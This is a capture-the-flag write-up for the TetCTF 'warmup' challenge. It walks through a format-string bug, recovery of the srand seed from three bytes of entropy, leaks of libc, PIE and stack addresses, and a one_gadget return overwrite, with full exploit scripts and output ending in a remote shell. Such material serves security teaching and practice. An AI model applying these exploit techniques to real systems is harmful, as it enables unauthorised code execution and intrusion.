# Warmup

`nc 192.46.228.70 32337`
[Download](https://drive.google.com/file/d/193AbQ0KUzbVAOfO0336-D7f8pktHYEgL/view?usp=sharing)
author: [@chung96vn](https://twitter.com/chung96vn)

## Decompilation

The usual initialisation functions for a C challenge are here:

```c
void handler(){
  puts("Time out!");
  exit(0);
}
unsigned int init_stuff(){
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  signal(14, (__sighandler_t)handler);
  return alarm(0x100);
}
int main(){
  init_stuff();
  main_main();
}
```

In `main_main()`, the real program exists:

```c
uint64_t money; // PIE+0x202050
char *buf;      // PIE+0x202058
void get_long_unsigned(unsigned __int64 *bss_ptr) {
  char s[136]; // [rsp+10h] [rbp-90h] BYREF
  memset(s, 0, 128);
  read(0, s, 0x80);
  __isoc99_sscanf(s, "%lu", bss_ptr);
  memset(s, 0, 0x80);
}
typedef struct Player {
    uint64_t *money;
    char name[0x80];
} Player;
int main_main(){
  buf = calloc(0x400, 1);
  Player *player = calloc(0x88, 1); // [rsp+8h] [rbp-8h]
  player->money = &money;
  do {
    printf("How much money you want? ");
    get_long_unsigned(&money);
  } while (money > 0x8000000000000000LL);
  Game(player);
  puts("Game Over");
  printf("Your money: %lu ZWD\n", money);
  printf("Send to author your feeback: ");
  read(0, buf, 0x400);
  return puts("Thank for your feedback");
}
```

Two `calloc()` buffers are allocated, one of size 0x400 (stored at .bss), and another of size 0x88 (stored at the stack). The 0x88 buffer is used to store a `Player`, which is used to run a `Game()`. After the `Game()` is over, we get to edit the pointer at`buf`, which should be the 0x400 pointer allocated by `calloc()`.

So far, so good. What about `Game()`?

```c
unsigned read_printable_n(char *s, signed int len) {
  // read n characters at max; break immediately on char value < 32, return number of chars read
  int i = 0;
  for (; i < len; ++i) {
    char buf;
    read(0, &buf, 1uLL);
    if ( buf == '\n' || buf <= 31 ) break;
    s[i] = buf;
  }
  return i;
}
void printf_padded(const char *s) {
// supposed to print s[], padded to 50 characters. FSB!
  printf(s);
  for (int i = strlen(s); i <= 48; ++i) putchar(' ');
  puts("*");
}
int getint() {
  char nptr[40]; // [rsp+10h] [rbp-30h] BYREF
  for (int i = 0; i <= 31; ++i) {
    char buf;
    read(0, &buf, 1uLL);
    if (buf == '\n') break;
    nptr[i] = buf;
  }
  return atoi(nptr);
}
void Game(Player *player) {
  printf("Player name: ");
  read_printable_n(player->name, 0x80); //read correct number of bytes (but with no nul-terminator)
  puts("**************************************************");
  puts("Danh de ra de ma` o? =]]                         *");
  puts("**************************************************");
  printf_padded(player->name);      // FSB!
  puts("**************************************************");
  int fd = open("/dev/urandom", 0); // [rsp+24h] [rbp-2Ch]
  if (fd < 0) {
    puts("Error");
    exit(0);
  }
  unsigned buf = 0; // [rsp+1Ch] [rbp-34h] BYREF
  read(fd, &buf, 3uLL);
  close(fd);
  srand(buf); // seed with 3 bytes of randomness
  unsigned roundNo = 1; // [rsp+20h] [rbp-30h]
  while (1) {
    printf("Round: %d\n", roundNo++);
    printf("Your money: %lu ZWD\n", *player->money);
    printf("Your bet (= 0 to exit): ");
    uint64_t bet = 0LL;// [rsp+30h] [rbp-20h] BYREF
    get_long_unsigned(&bet);
    if (!bet) break;
    printf("Your choice: ");
    guess = get_int(); // [rsp+28h] [rbp-28h]
    unsigned lucky_num = rand(); // [rsp+2Ch] [rbp-24h]
    printf("Lucky number: %u\n", lucky_num);
    if ( guess == lucky_num )
      *player->money += bet + rand();
    else
      *player->money -= bet + rand();
  }
}
```
That's long, but there are a few points of obvious interest:
1. `printf()` occurs with a user-controlled format string (located on the **heap**, not the stack) of 0x80+ bytes. This happens only once, so unless we're willing to dig in with a [one-shot format string exploit](https://ctftime.org/writeup/16081), we'll probably have to do something else here.
2. There's a big while loop involving the use of `rand()` to modify `*player->money`. The purpose of this is not immediately clear; why would we need to edit `money` anyway?

In any case, the presence of `rand()` in a CTF usually indicates the need to predict its pseudorandom output.

## Breaking `rand()`
We'll start by setting up a standard script to interact with the remote:
```python
from pwnscripts import *
from re import findall
context.binary = 'warmup'
context.libc_database = '../libc-database'
context.libc = 'libc-2.23.so'
def start(s: bytes):
    r = remote('192.46.228.70', 32337)
    r.sendlineafter('want? ', '0')
    r.sendafter('name: ', s)
    for _ in range(3): r.recvline()
    return r,r.recvline()
def findnum(s: bytes): return int(findall(b'[0-9]+', s)[0])
def show_money(): # name is a bit of a misnomer, this tries to grab the money displayed at the start of a round
    r.recvuntil('Your money: ')
    return findnum(r.recvline())
def Round(bet: int, choice: int):
    r.sendlineafter('(= 0 to exit): ', str(bet))
    r.sendlineafter('choice: ', str(choice))
    return findnum(r.recvline())
r, _ = start('\n')
log.info('money (should be 0): %d' % show_money())
log.info('luckynum (trying 1): %d' % Round(1,1))
r.interactive()
```
Resulting in
```
[x] Opening connection to 192.46.228.70 on port 32337
[x] Opening connection to 192.46.228.70 on port 32337: Trying 192.46.228.70
[+] Opening connection to 192.46.228.70 on port 32337: Done
[*] money (should be 0): 0
[*] luckynum (trying 1): 1160767648
[*] Switching to interactive mode
Round: 2
Your money: 18446744072331449552 ZWD
Your bet (= 0 to exit):
```
(That big number at the end is `0xffffffffaddbd4d0L`; the natural consequence of `money` underflowing from 0)

Although `/dev/urandom` itself is too random to easily predict, `srand()` is only initiated with 3 bytes of input from the device, with the Most Significant Byte being `0`. That's ~16 million possible seeds, which is *big*, but not<sup>1</sup> big enough to prevent us from generating a huge-ass hash table of `rand()` output-to-seed tuples:
```python
from ctypes import CDLL
from pickle import dump
from tqdm import tqdm
glibc = CDLL('./libc-2.23.so')
nums = {}
for i in tqdm(range(0xffffff)):
    glibc.srand(i)
    t = tuple(glibc.rand() for _ in range(3))   # 2 rand()s is statistically sufficient
    t = (t[0], t[2]) # remove the rand() that isn't printed by warmup
    nums[t] = nums.get(t, ())+(i,)
with open('srand_dict.pickle', 'wb') as f: dump(nums, f)
```
`srand_dict.pickle` contains a python `dict` of `{(0th rand(), 2nd rand()): seed}` key-pairs. We can load this dictionary in our main exploit script to accurately predict the random values used by the server:
```python
r, _ = start('\n')
log.info('money (should be 0): %d' % show_money())
randints = [Round(1,1)]
log.info('money (aft round 1): %d' % show_money())
randints.append(Round(1,1))
log.info('money (aft round 2): %d' % (money:=show_money()))
from pickle import load
log.info('LOADING SEED DICT')
with open("srand_dict.pickle", 'rb') as f: seed_dict = load(f)
seeds = seed_dict[tuple(randints)]
assert len(seeds) == 1  # Unlikely but possible
seed = seeds[0]
log.info('seed found! %d' % seed)
# To verify this seed, let's predict the next bet.
from ctypes import CDLL
glibc = CDLL('./libc-2.23.so')
glibc.srand(seed)
for _ in range(2*2): glibc.rand() # run through the already-used seeds
log.info('According to our predictions, %d == %d!' % (Round(1,1), glibc.rand()))
```
It works:
```python
[+] Opening connection to 192.46.228.70 on port 32337: Done
[*] money (should be 0): 0
[*] money (aft round 1): 18446744072129837390
[*] money (aft round 2): 18446744070518320621
[*] LOADING SEED DICT
[*] seed found! 6897926
[*] According to our predictions, 450409924 == 450409924!
```
Now what?
## Format string usage
I started by making a dump (ASLR off here) of the stack to see what we could do:
```c
gef➤  telescope 50
0x00007ffffffedd58│+0x0000: 0x0000000008000d35  →   mov rax, QWORD PTR [rbp-0x18]        ← $rsp
0x00007ffffffedd60│+0x0008: 0x0000008000000000
0x00007ffffffedd68│+0x0010: 0x0000000008403428  →  0x000000006b637566 ("heck"?)
0x00007ffffffedd70│+0x0018: 0x00007ffffffedde0  →  0x00007ffffffede00  →  0x00007ffffffede10  →  0x00000000080011d0  →   push r15
0x00007ffffffedd78│+0x0020: 0x0000000008000b00  →   xor ebp, ebp
0x00007ffffffedd80│+0x0028: 0x00007ffffffedde0  →  0x00007ffffffede00  →  0x00007ffffffede10  →  0x00000000080011d0  →   push r15   ← $rbp
0x00007ffffffedd88│+0x0030: 0x0000000008000e9f  →   lea rdi, [rip+0x3ca]        # 0x8001270
0x00007ffffffedd90│+0x0038: 0x0000000000000000
0x00007ffffffedd98│+0x0040: 0x0000000008403420  →  0x0000000008202050  →  0x0000000000000001
0x00007ffffffedda0│+0x0048: 0x0000000000000000
0x00007ffffffedda8│+0x0050: 0x0000000000000000
0x00007ffffffeddb0│+0x0058: 0x0000000000000001
0x00007ffffffeddb8│+0x0060: 0x0000000000000000
0x00007ffffffeddc0│+0x0068: 0x0000000000000000
0x00007ffffffeddc8│+0x0070: 0xeef52044fc1cae00
0x00007ffffffeddd0│+0x0078: 0x0000000008000b00  →   xor ebp, ebp
0x00007ffffffeddd8│+0x0080: 0x0000000000000000
0x00007ffffffedde0│+0x0088: 0x00007ffffffede00  →  0x00007ffffffede10  →  0x00000000080011d0  →   push r15
0x00007ffffffedde8│+0x0090: 0x00000000080010c3  →   lea rdi, [rip+0x297]        # 0x8001361
0x00007ffffffeddf0│+0x0098: 0x00007ffffffedef0  →  0x0000000000000001
0x00007ffffffeddf8│+0x00a0: 0x0000000008403420  →  0x0000000008202050  →  0x0000000000000001
0x00007ffffffede00│+0x00a8: 0x00007ffffffede10  →  0x00000000080011d0  →   push r15
0x00007ffffffede08│+0x00b0: 0x00000000080011c2  →   mov eax, 0x0
0x00007ffffffede10│+0x00b8: 0x00000000080011d0  →   push r15
0x00007ffffffede18│+0x00c0: 0x00007fffff0802e1  →  <__libc_start_main+241> mov edi, eax
0x00007ffffffede20│+0x00c8: 0x00007fffff3f57d8  →  0x00007fffff07fc20  →  <init_cacheinfo+0> push r15
0x00007ffffffede28│+0x00d0: 0x00007ffffffedef8  →  0x00007ffffffee14f  →  "/warmup"
0x00007ffffffede30│+0x00d8: 0x00000001ff1c1508
0x00007ffffffede38│+0x00e0: 0x00000000080011aa  →   push rbp
0x00007ffffffede40│+0x00e8: 0x0000000000000000
0x00007ffffffede48│+0x00f0: 0xb12e2943ebbe0993
0x00007ffffffede50│+0x00f8: 0x0000000008000b00  →   xor ebp, ebp
0x00007ffffffede58│+0x0100: 0x00007ffffffedef0  →  0x0000000000000001
```
A couple of things worth noting here.
1. Easy ASLR leaks. 
   * libc, from `__libc_start_main_ret` (`+0x00c0`)
   * PIE, from any of the other return pointers (I chose `+0x30`)
   * The stack, for which I used the relatively stable pointer located 2 pointers after `__libc_start_main_ret` (`+0x00d0`)
2. Pointers to edit. Because of our ability to predict the output of `rand()`, modifying the `player->money` pointer will allow for an arbitrary (8-byte) write at that specific pointer. Because `player->money` is originally pointing to PIE+0x202050, a single-byte `%hhn` write to `*player` will allow us to modify any value from PIE+0x202000 to PIE+0x2020ff.
    ```c
    .bss:0000000000202020 stdout          dq ?                    ; DATA XREF: LOAD:0000000000000508↑o
    .bss:0000000000202030 stdin           dq ?                    ; DATA XREF: LOAD:0000000000000520↑o
    .bss:0000000000202040 stderr          dq ?                    ; DATA XREF: LOAD:0000000000000538↑o
    .bss:0000000000202048 byte_202048     db ?                    ; DATA XREF: sub_BC0↑r
    .bss:0000000000202050 ; unsigned __int64 money
    .bss:0000000000202058 buf             dq ?                    ; DATA XREF: main_main+17↑w
    ```
   Although replacing the `std*` pointers might work via `FILE*` exploitation, I chose to overwrite `buf` instead, because the end of `main_main()` gives us the opportunity to flood it with a larger input:
    ```c
    printf("Send to author your feeback: ");
    read(0, buf, 0x400);
    return puts("Thank for your feedback");
    ```
   If we replace `buf` with a pointer to the stack, we'll be able to insert a ROP-chain ahead of a function frame, giving an immediate challenge solve with the other pointers leaked by printf.

Implementing this is easy with `pwnscripts`. We'll start by gathering offsets for `printf()`:
```python
@context.quiet
def printf(s: bytes):
    r,rtr = start(s)
    r.close()   # prevent xinetd from booting us
    return rtr
PIE_ret = 0xE9F # the constant 1.5 lowest bytes for the PIE address we're leaking
PIE_offset  = fsb.find_offset.PIE(printf, offset=PIE_ret)
money_offset= fsb.find_offset.PIE(printf, offset=0x20)  # this should correspond with the calloc pointer to `player`
libc_offset = fsb.find_offset.libc(printf, offset=context.libc.symbols['__libc_start_main_ret']&0xfff)
stack_offset= libc_offset+2
log.info('important printf() offsets: %d %d %d' % (money_offset, libc_offset, PIE_offset))
```
Running this (with `context.log_level = 'debug'`):
```python
[DEBUG] pwnscripts: extracted 0xd
[DEBUG] pwnscripts: extracted 0x560fcd522270
[DEBUG] pwnscripts: extracted 0x55eb02255428
[DEBUG] pwnscripts: extracted -0x1
[DEBUG] pwnscripts: extracted 0x7fff107629e0
[DEBUG] pwnscripts: extracted 0x7ffe8209b540
[DEBUG] pwnscripts: extracted 0x55597a4cce9f
[*] pwnscripts.fsb.find_offset for 'PIE': 11
[DEBUG] pwnscripts: extracted 0xd
[DEBUG] pwnscripts: extracted 0x561a4e1a4270
[DEBUG] pwnscripts: extracted 0x557f2cb32428
[DEBUG] pwnscripts: extracted -0x1
[DEBUG] pwnscripts: extracted 0x7ffe1a30fb10
[DEBUG] pwnscripts: extracted 0x7ffc468d6260
[DEBUG] pwnscripts: extracted 0x55b161816e9f
[DEBUG] pwnscripts: extracted -0x1
[DEBUG] pwnscripts: extracted 0x55c4b535e420
[*] pwnscripts.fsb.find_offset for 'PIE': 13
[DEBUG] pwnscripts: extracted 0xd
[DEBUG] pwnscripts: extracted 0x55d8562f7270
[DEBUG] pwnscripts: extracted 0x55de9b4f4428
[DEBUG] pwnscripts: extracted -0x1
[DEBUG] pwnscripts: extracted 0x7ffdd8503e40
[DEBUG] pwnscripts: extracted 0x7fff355ec1b0
[DEBUG] pwnscripts: extracted 0x55ac42025e9f
[DEBUG] pwnscripts: extracted -0x1
[DEBUG] pwnscripts: extracted 0x55ea72259420
[DEBUG] pwnscripts: extracted -0x1
[DEBUG] pwnscripts: extracted -0x1
[DEBUG] pwnscripts: extracted 0x1
[DEBUG] pwnscripts: extracted -0x1
[DEBUG] pwnscripts: extracted -0x1
[DEBUG] pwnscripts: extracted 0xf25b29d7e24df000
[DEBUG] pwnscripts: extracted 0x7ffd565bdf10
[DEBUG] pwnscripts: extracted -0x1
[DEBUG] pwnscripts: extracted 0x7ffd11d8de40
[DEBUG] pwnscripts: extracted 0x55e63b0560c3
[DEBUG] pwnscripts: extracted 0x558e9746bb00
[DEBUG] pwnscripts: extracted 0x55effdbdd420
[DEBUG] pwnscripts: extracted 0x7ffeaeaf7d50
[DEBUG] pwnscripts: extracted 0x55624eeb41c2
[DEBUG] pwnscripts: extracted 0x5580ccc0e1d0
[DEBUG] pwnscripts: extracted 0x7fa8da2f3840
[*] pwnscripts.fsb.find_offset for 'libc': 29
[*] important printf() offsets: 13 29 11
```
That works, albeit slowly<sup>2</sup>. We'll replace it all with constants for now, culminating in this current script:
```python
from pwnscripts import *
from re import findall
context.binary = 'warmup'
context.libc_database = '../libc-database'
context.libc = 'libc-2.23.so'
def start(s: bytes):
    r = remote('192.46.228.70', 32337)
    r.sendlineafter('want? ', '0')
    r.sendafter('name: ', s)
    for _ in range(3): r.recvline()
    return r,r.recvline()
def findnum(s: bytes): return int(findall(b'[0-9]+', s)[0])
def show_money(): # name is a bit of a misnomer, this tries to grab the money displayed at the start of a round
    r.recvuntil('Your money: ')
    return findnum(r.recvline())
def Round(bet: int, choice: int):
    r.sendlineafter('(= 0 to exit): ', str(bet))
    r.sendlineafter('choice: ', str(choice))
    return findnum(r.recvline())

# Step 0: find printf() offsets
@context.quiet
def printf(s: bytes):
    r,rtr = start(s)
    r.close()   # prevent xinetd from booting us
    return rtr
PIE_ret = 0xE9F # the constant 1.5 lowest bytes for the PIE address we're leaking
PIE_offset  = 11#fsb.find_offset.PIE(printf, offset=PIE_ret)
money_offset= 13#fsb.find_offset.PIE(printf, offset=0x20)  # this should correspond with the calloc pointer to `player`
libc_offset = 29#fsb.find_offset.libc(printf, offset=context.libc.symbols['__libc_start_main_ret']&0xfff)
stack_offset= libc_offset+2
```
Now, we'll need to accomplish ROP.
## How about that ROP?
We'll start the remote connection by extracting all of the ASLR leaks mentioned above.
```python
# step 1: leak PIE+heap; overwrite the ptr to money with a ptr to .bss[buf].
context.binary.symbols['buf'] = 0x202058
r, infoleak = start('%{}c%{}$hhn||%{}$p,%{}$p,%{}$p\0'.format(
                    context.binary.symbols['buf']&0xff,
                    money_offset, PIE_offset, libc_offset, stack_offset)
              )
PIE_leak, libc_leak, stack_leak = unpack_many_hex(infoleak.split(b'||')[1])
context.libc.calc_base('__libc_start_main_ret', libc_leak)
context.binary.address = PIE_leak - PIE_ret
log.info('PIE: %s' % hex(context.binary.address))
log.info('Libc:%s' % hex(context.libc.address))
log.info('Stack return addr: %s' % hex(stack_ret := stack_leak-0xe0)) # bruteforce 0xe0 on remote...
```
I'm cheating a bit here by omitting how<sup>3</sup> I obtained the magic number `0xe0`. In any case, we've now essentially leaked everything, while also modifying `player->money` to point to `.bss[buf]`.

Next, we'll need to modify `buf` to point to a return pointer on the stack. Continuing from the `srand()` prediction system hashed out earlier, we'll do a few calculations to adjust `buf` by Round 3:
```python
# step 2: set .bss[buf] to point to stack_ret
randints = [Round(1,1), Round(1,1)]
from pickle import load
log.info('LOADING SEED DICT')
with open("srand_dict.pickle", 'rb') as f: seed_dict = load(f)
seeds = seed_dict[tuple(randints)]
assert len(seeds) == 1  # Unlikely but possible
seed = seeds[0]
log.info('seed found! %d' % seed)
from ctypes import CDLL
glibc = CDLL('./libc-2.23.so')
glibc.srand(seed)
for _ in range(2*2): glibc.rand() # run through the already-used seeds

# step 3: with rand() handled, we can adjust buf[].
lucky_num = glibc.rand()
diff = stack_ret-show_money()-glibc.rand() # diff is guaranteed to be greatly positive,
#### because stack pointers (0x7ff[0-9a-f]{9}) >> heap pointers (0x5[0-9a-f]{11})
Round(diff, lucky_num)
log.info('money (which is buf!): ' + hex(show_money()))
```
You'll get this:
```python
[+] Opening connection to 192.46.228.70 on port 32337: Done
[*] PIE: 0x556385c1c000
[*] Libc:0x7f9627801000
[*] Stack return addr: 0x7ffeb86d7a08
[*] LOADING SEED DICT
[*] seed found! 15904512
[*] money (which is buf!): 0x7ffeb86d7a08
```
You can't really tell whether or not `buf` is pointing to the right location at this point, so we'll need to put it to the test.

Because we're using `libc-2.23.so` here, there are a lot of really good `one_gadgets` available:
```python
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```
The first one Just Works :tm:, so there's actually no need for ROP at all here:
```python
# step 4: overwrite ret with a one_gadget.
r.sendlineafter('(= 0 to exit): ', '0')
r.sendafter('back: ', pack(context.libc.select_gadget(0)))
r.interactive()
```
Solved.
```sh
[+] Opening connection to 192.46.228.70 on port 32337: Done
[*] PIE: 0x55c1acad6000
[*] Libc:0x7f242193d000
[*] Stack return addr: 0x7ffdb4cc1b28
[*] LOADING SEED DICT
[*] seed found! 5816947
[*] money (which is buf!): 0x7ffdb4cc1b28
[*] Switching to interactive mode
Thank for your feedback
$ whoami
warmup
$ cat /home/warmup/flag
```
## Flag
`TetCTF{viettel: *100*311267385452644#}$`
# Footnotes
1. It was big enough to crash my 8GB RAM windows setup, but it ran fine on a beefier linux server.
2. To speed things up, I'll be implementing a caching system for the `.find_offset` module... soon.
3. Modify the stack address calculation to `stack_ret := stack_leak-int(argv[1])*context.bytes` (add `from sys import argv` somewhere), and then run `for i in $(seq 1 20); do python3.8 solve.py $i; done`. The offset that succeeds without an `EOFError` is the winner.
   Bruteforcing is really necessary here. The offset on remote != offset on local, even while running the binary with the given libc version.

